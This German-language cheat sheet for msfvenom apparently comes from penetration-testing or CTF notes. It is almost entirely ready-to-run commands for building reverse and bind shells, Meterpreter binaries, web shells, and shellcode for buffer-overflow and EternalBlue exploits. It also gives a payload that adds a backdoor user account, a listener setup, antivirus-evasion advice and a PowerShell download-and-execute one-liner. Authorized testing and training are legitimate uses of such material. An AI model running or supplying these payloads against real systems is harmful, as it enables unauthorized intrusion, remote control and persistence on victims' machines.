# 💣 msfvenom Cheatsheet

## Syntax

```
msfvenom -p <payload> <OPTIONS> -f <format> -o <output>
```

| Flag | Bedeutung |
|---|---|
| `-p` | Payload |
| `-f` | Format (exe, elf, raw, war, php, asp, aspx, dll, ...) |
| `-o` | Output-File |
| `-e` | Encoder (`x86/shikata_ga_nai`) |
| `-i` | Iterations für Encoder |
| `-b` | Bad chars (`'\x00\x0a'`) |
| `--platform` | windows / linux |
| `-a` | Architecture (x86, x64) |

## Payload-Liste (häufigste)

```bash
msfvenom -l payloads | grep reverse_tcp | head
```

## Linux Payloads

```bash
# Reverse Shell ELF (x64)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o shell

# Meterpreter ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o meter

# Bind Shell
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind
```

## Windows Payloads

```bash
# Staged Reverse Shell EXE
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe

# Stageless (besser bei AV)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o meter.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o meter.exe   # stageless

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o shell.dll

# MSI (für AlwaysInstallElevated!)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi

# Service (für sc create)
msfvenom -p windows/x64/exec CMD='net user hacker P@ssw0rd! /add' -f exe-service -o evil-service.exe
```

> **Achtung Defender:** msfvenom-EXEs werden fast immer erkannt. Wenn AV aktiv ist,
> nicht gegen Signaturen ankämpfen → LOLBin-binPath / eigenes mingw-C / In-Memory nehmen.
> → [AV-Evasion](./av-evasion.md)

## Web Payloads

```bash
# PHP
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=4444 -f raw -o shell.php
# Davor `<?php` einfügen falls nötig

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war

# ASP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o shell.aspx
```

## Shellcode für eigenen Loader

```bash
# C-Format (für eigene Exploits / Loader)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f c

# Python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f python

# Raw (für Buffer Overflow)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -b '\x00\x0a\x0d' -f raw

# Speziell EternalBlue (AutoBlue erwartet rohen Shellcode):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o sc_x64_msf.bin
```
→ EternalBlue-Workflow: [eternalblue-ms17-010.md](../02-Exploitation/Windows/eternalblue-ms17-010.md)

## Bad-Char-Removal (Buffer Overflow)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -b '\x00\x0a\x0d\x20' -e x86/shikata_ga_nai -i 5 -f c
```

## Listener (Multi-Handler)

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost tun0; set lport 4444; set ExitOnSession false; run -j"
```

## Quick One-Liners

```bash
# Linux Reverse Shell als One-Liner
msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=4444

# Windows ohne msfvenom — base64 PowerShell
echo 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/r.ps1")' | iconv -t UTF-16LE | base64 -w0
# Dann: powershell -enc <BASE64>
```
